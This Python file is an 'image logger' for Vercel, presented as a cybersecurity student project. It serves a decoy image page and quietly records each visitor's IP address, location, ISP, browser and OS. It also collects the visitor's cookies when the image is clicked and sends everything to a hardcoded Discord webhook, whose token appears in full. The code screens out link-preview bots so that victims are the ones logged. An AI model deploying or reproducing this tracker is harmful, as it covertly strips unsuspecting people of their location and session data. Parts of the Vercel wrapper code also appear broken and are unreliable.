# Image Logger Plus - Vercel Compatible
# Enhanced for Cybersecurity Project

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, re, json, os

__app__ = "Discord Image Logger Plus"
__description__ = "Advanced IP and data collection tool"
__version__ = "v3.1"
__author__ = "Cybersecurity Student"

config = {
    "webhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",
    "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
    "imageArgument": True,
    "username": "Data Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "This browser has been accessed for security research purposes.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://example.com"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not ip or not useragent:
        return False
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    elif "googlebot" in useragent.lower():
        return "Google Bot"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while logging data!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        }, timeout=5)
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, additional_data=None):
    if not ip or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"Image Logging link sent!\n\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
                        }
                    ],
                }, timeout=5)
            except:
                pass
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {}

    ping = "@everyone" if not info.get("proxy") else ""

    if info.get("hosting"):
        if config["antiBot"] in [3, 4]:
            return
        elif config["antiBot"] in [1, 2]:
            ping = ""

    os_name, browser = "Unknown", "Unknown"
    if useragent:
        try:
            os_name, browser = httpagentparser.simple_detect(useragent)
        except:
            pass

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Advanced Data Capture",
                "color": config["color"],
                "description": f"""**User Interaction Detected!**

**Endpoint:** {endpoint}
                
**IP Info:**
> **IP:** {ip}
> **ISP:** {info.get('isp', 'Unknown')}
> **Country:** {info.get('country', 'Unknown')}
> **City:** {info.get('city', 'Unknown')}
> **Coords:** {f"{info.get('lat', '?')}, {info.get('lon', '?')}" if not coords else coords}
> **Mobile:** {info.get('mobile', 'Unknown')}
> **VPN/Proxy:** {info.get('proxy', 'Unknown')}

**System Info:**
> **OS:** {os_name}
> **Browser:** {browser}

**Additional Data:**
{format_additional_data(additional_data)}
""",
            }
        ],
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except:
        pass

    return info

def format_additional_data(data):
    if not data:
        return "No additional data captured"
    return "\n".join([f"> **{k}:** {v}" for k, v in data.items()])

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        self.handle_request()
        
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length:
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data)
                if self.path.endswith('/collect'):
                    self.handle_data_collection(data)
                    return
            except:
                pass
        self.handle_request()

    def handle_request(self):
        try:
            # Get client IP from Vercel headers
            ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
            if not ip:
                ip = self.headers.get('x-real-ip', 'Unknown')

            # Skip blacklisted IPs
            if ip.startswith(blacklistedIPs):
                self.send_response(403)
                self.end_headers()
                return

            # Parse URL parameters
            parsed_path = parse.urlparse(self.path)
            query_params = parse.parse_qs(parsed_path.query)
            
            # Handle data collection endpoint
            if parsed_path.path.endswith('/collect'):
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode())
                return

            # Get image URL
            url = config["image"]
            if config["imageArgument"]:
                if query_params.get("url"):
                    url = base64.b64decode(query_params["url"][0]).decode()
                elif query_params.get("id"):
                    url = base64.b64decode(query_params["id"][0]).decode()

            # Prepare basic data
            additional_data = {
                "Referer": self.headers.get('Referer', 'None'),
                "Language": self.headers.get('Accept-Language', 'None'),
                "Endpoint": parsed_path.path
            }

            # Serve bot requests
            user_agent = self.headers.get('user-agent', '')
            if botCheck(ip, user_agent):
                self.send_response(200 if config["buggedImage"] else 302)
                if config["buggedImage"]:
                    self.send_header('Content-type', 'image/jpeg')
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self.send_header('Location', url)
                    self.end_headers()
                
                makeReport(
                    ip, 
                    user_agent, 
                    endpoint=parsed_path.path, 
                    url=url,
                    additional_data={"Status": "Bot detected"}
                )
                return

            # Serve HTML to regular users
            html = self.generate_html(url)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())

            # Make initial report
            makeReport(
                ip, 
                user_agent, 
                endpoint=parsed_path.path, 
                url=url,
                additional_data={"Status": "Initial access"}
            )
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(str(e))

    def handle_data_collection(self, data):
        try:
            # Get client IP from Vercel headers
            ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
            if not ip:
                ip = self.headers.get('x-real-ip', 'Unknown')
                
            user_agent = self.headers.get('user-agent', 'Unknown')
            
            # Prepare additional data
            additional_data = {
                "Screen Size": data.get('systemInfo', {}).get('Screen Size', 'Unknown'),
                "Device Memory": data.get('systemInfo', {}).get('Device Memory', 'Unknown'),
                "CPU Cores": data.get('systemInfo', {}).get('CPU Cores', 'Unknown'),
                "Location": data.get('coords', 'None'),
                "Referrer": data.get('referrer', 'None'),
                "Cookies": (data.get('cookies', 'None')[:50] + "...") if data.get('cookies') else "None"
            }

            makeReport(
                ip, 
                user_agent, 
                additional_data=additional_data, 
                endpoint="/collect"
            )

        except Exception as e:
            reportError(f"Data collection error: {str(e)}")

    def generate_html(self, image_url):
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Loading Image...</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }}
        .container {{
            max-width: 800px;
            padding: 20px;
        }}
        .img-container {{
            margin: 0 auto;
            width: 100%;
            max-width: 600px;
            cursor: pointer;
        }}
        .img-container img {{
            width: 100%;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }}
        .message {{
            color: #666;
            font-size: 18px;
            margin-top: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="img-container" onclick="collectData()">
            <img src="{image_url}" alt="Loading image">
        </div>
        <div class="message">Click the image to view full size</div>
    </div>

    <script>
        async function collectData() {{
            const data = {{
                screenSize: `${screen.width}x${screen.height}`,
                referrer: document.referrer || "None",
                cookies: document.cookie || "None"
            }};
            
            try {{
                // Send data to server
                await fetch('./collect', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(data)
                }});
                
                // Proceed to actual image
                window.location.href = "{image_url}";
                
            }} catch (error) {{
                console.error('Error:', error);
                window.location.href = "{image_url}";
            }}
        }}
    </script>
</body>
</html>'''

# Vercel handler function
def handler(request):
    from io import BytesIO
    import sys
    
    class VercelWrapper:
        def __init__(self, request):
            self.request = request
            self.headers = request.headers
            self.path = request.path
            self.command = request.method
            self.wfile = BytesIO()
            self.rfile = BytesIO(request.get_body())
            
        def get_response(self):
            self.wfile.seek(0)
            body = self.wfile.read()
            return {
                'statusCode': self.status,
                'headers': dict(self.response_headers),
                'body': body.decode('utf-8') if isinstance(body, bytes) else body
            }
    
    # Create wrapper
    wrapper = VercelWrapper(request)
    wrapper.response_headers = []
    wrapper.status = 200
    
    # Create handler
    handler = ImageLoggerAPI()
    handler.headers = wrapper.headers
    handler.path = wrapper.path
    handler.command = wrapper.command
    handler.wfile = wrapper.wfile
    handler.rfile = wrapper.rfile
    
    # Handle request
    if wrapper.command == 'GET':
        handler.do_GET()
    elif wrapper.command == 'POST':
        handler.do_POST()
    
    return wrapper.get_response()

# Vercel requires this export
if os.getenv('VERCEL'):
    from http.server import BaseHTTPRequestHandler
    import json as vercel_json
    
    class VercelHandler(BaseHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, **kwargs)
        
        def do_GET(self):
            self.handle_request()
            
        def do_POST(self):
            self.handle_request()
            
        def handle_request(self):
            try:
                # Simplified handling for Vercel
                ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
                user_agent = self.headers.get('user-agent', '')
                
                # Send response
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                # Get image URL
                url = config["image"]
                parsed_path = parse.urlparse(self.path)
                query_params = parse.parse_qs(parsed_path.query)
                if config["imageArgument"] and query_params.get("url"):
                    url = base64.b64decode(query_params["url"][0]).decode()
                
                # Return HTML
                html = ImageLoggerAPI().generate_html(url)
                self.wfile.write(html.encode())
                
                # Make report
                makeReport(ip, user_agent, endpoint=parsed_path.path, url=url)
                
            except Exception as e:
                self.send_error(500, message=str(e))
                reportError(str(e))
    
    # Export for Vercel
    def vercel_entrypoint(request):
        # Vercel serverless handler
        handler = VercelHandler(request)
        return handler.handle_request()
    
    # Export for Vercel
    def vercel_handler(request, context):
        return vercel_entrypoint(request)
